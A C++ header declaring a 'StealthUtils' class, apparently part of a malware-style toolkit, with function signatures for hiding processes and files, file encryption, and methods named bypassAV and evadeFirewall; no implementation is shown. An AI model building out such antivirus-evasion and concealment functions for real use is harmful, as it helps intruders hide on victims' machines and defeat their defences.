#ifndef STEALTHUTILS_H
#define STEALTHUTILS_H

#include <string>
#include <vector>

class StealthUtils {
public:
    static void hide();
    static void unhide();
    static void hideFile(const std::string& filePath, const std::string& key);
    static void unhideFile(const std::string& filePath, const std::string& key);

private:
    static bool checkSuccess(bool result, const std::string& errorMessage);
    static void logOperation(const std::string& operation, bool success, const std::string& additionalInfo = "");
    static bool setWindowsFileAttributes(const std::string& filePath, DWORD attributes);
    static void hideProcessOnUnix(const std::string& newName);
    static void unhideProcessOnUnix();
    static void encryptFile(const std::string& filePath, const std::string& key, const std::string& outputFilePath);
    static void decryptFile(const std::string& filePath, const std::string& key, const std::string& outputFilePath);
    static bool bypassAV(const std::string& avName);
    static bool evadeFirewall(const std::vector<std::string>& firewallRules);
};

#endif // STEALTHUTILS_H

